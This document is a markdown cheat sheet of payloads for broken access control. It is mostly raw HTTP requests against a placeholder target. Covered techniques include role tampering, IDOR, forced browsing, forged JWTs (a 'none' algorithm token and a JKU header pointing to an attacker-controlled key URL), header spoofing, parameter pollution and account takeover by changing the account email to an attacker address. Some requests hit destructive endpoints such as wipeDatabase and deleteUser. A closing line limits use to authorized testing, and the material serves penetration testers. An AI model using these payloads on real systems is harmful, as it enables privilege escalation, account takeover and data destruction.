# Complete Broken Access Control Payloads

This document provides comprehensive payloads and techniques for testing Broken Access Control vulnerabilities, including vertical/horizontal privilege escalation, insecure direct object references (IDOR), and other authorization flaws.

## Table of Contents
1. [Vertical Privilege Escalation](#vertical-privilege-escalation)
2. [Horizontal Privilege Escalation](#horizontal-privilege-escalation)
3. [IDOR Techniques](#idor-techniques)
4. [Parameter Manipulation](#parameter-manipulation)
5. [HTTP Method Manipulation](#http-method-manipulation)
6. [JWT Token Manipulation](#jwt-token-manipulation)
7. [API Authorization Testing](#api-authorization-testing)
8. [Admin Functionality Access](#admin-functionality-access)
9. [Metadata Manipulation](#metadata-manipulation)
10. [Advanced Bypass Techniques](#advanced-bypass-techniques)

---

## Vertical Privilege Escalation

### Role Parameter Manipulation
```http
POST /updateProfile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=user_session

{
  "user_id": "user123",
  "role": "admin"
}
```

### Forced Browsing to Admin Panel
```http
GET /admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=low_priv_session
```

### Privileged API Endpoint Access
```http
POST /api/admin/createUser HTTP/1.1
Host: target.com
Authorization: Bearer user_token

{
  "username": "new_admin",
  "role": "super_admin"
}
```

---

## Horizontal Privilege Escalation

### User ID Switching
```http
GET /api/user/profile?user_id=67890 HTTP/1.1
Host: target.com
Cookie: session=user123_session
```

### Account Takeover via Email Change
```http
PUT /api/account/email HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token

{
  "new_email": "attacker@evil.com"
}
```

### Order Details Access
```http
GET /api/orders/5678 HTTP/1.1
Host: target.com
Cookie: session=user123_session
```

---

## IDOR Techniques

### Direct Object Reference
```http
GET /download?file=user789_secret.docx HTTP/1.1
Host: target.com
Cookie: session=user123_session
```

### Batch IDOR Request
```http
POST /api/batchUsers HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user_ids": ["123", "456", "789"]
}
```

### Blind IDOR Testing
```http
GET /api/user/checkAccess?resource_id=789 HTTP/1.1
Host: target.com
```

---

## Parameter Manipulation

### JSON Payload Tampering
```http
PATCH /api/users/123 HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "id": "456",
  "permissions": ["read", "write", "delete"]
}
```

### URL Parameter Tampering
```http
GET /api/user?account_id=456&action=delete HTTP/1.1
Host: target.com
```

### Hidden Parameter Discovery
```http
POST /updateSettings HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user_id=456&is_admin=true
```

---

## HTTP Method Manipulation

### GET to POST Conversion
```http
POST /api/user/delete/123 HTTP/1.1
Host: target.com
```

### PUT Method Exploitation
```http
PUT /api/users/456/permissions HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "permissions": ["admin"]
}
```

### HEAD Method for Discovery
```http
HEAD /admin/ HTTP/1.1
Host: target.com
```

---

## JWT Token Manipulation

### Role Claim Tampering
```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJfYWRtaW4ifQ.changed_signature
```

### None Algorithm Exploit
```http
GET /api/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### JKU Header Injection
```http
GET /api/admin HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleXMuanNvbiJ9.evil_payload
```

---

## API Authorization Testing

### Missing Authorization Header
```http
GET /api/v1/users HTTP/1.1
Host: target.com
```

### API Key Privilege Escalation
```http
GET /api/v1/admin/settings HTTP/1.1
Host: target.com
X-API-Key: stolen_low_priv_key
```

### GraphQL Authorization Bypass
```graphql
query {
  adminDashboard {
    allUsers {
      email
      creditCards
    }
  }
}
```

---

## Admin Functionality Access

### Direct Admin Panel Access
```http
GET /admin/deleteUser?id=123 HTTP/1.1
Host: target.com
Cookie: session=user_session
```

### Admin API Endpoint Access
```http
POST /internal/api/wipeDatabase HTTP/1.1
Host: target.com
```

### Configuration File Access
```http
GET /.git/config HTTP/1.1
Host: target.com
```

---

## Metadata Manipulation

### User-Agent Based Access Control
```http
GET /admin/ HTTP/1.1
Host: target.com
User-Agent: InternalAdminTool/1.0
```

### IP Based Privilege Escalation
```http
GET /internal/ HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.1
```

### Referer Header Bypass
```http
GET /admin/panel HTTP/1.1
Host: target.com
Referer: https://target.com/admin/
```

---

## Advanced Bypass Techniques

### Unicode Normalization Bypass
```http
GET /admin/%C3%A0dmin/panel HTTP/1.1  # àdmin looks like admin
Host: target.com
```

### HTTP Parameter Pollution
```http
GET /api/user?account_id=legit_id&account_id=victim_id HTTP/1.1
Host: target.com
```

### Cache Poisoning for Authorization
```http
GET /account HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

### WebSocket Authorization Bypass
```javascript
const ws = new WebSocket('wss://target.com/admin');
ws.onopen = () => {
  ws.send(JSON.stringify({action: "getSensitiveData"}));
};
```

Remember to only use these payloads for authorized security testing. Unauthorized testing may violate laws and regulations. Always obtain proper permission before conducting security assessments and follow responsible disclosure practices.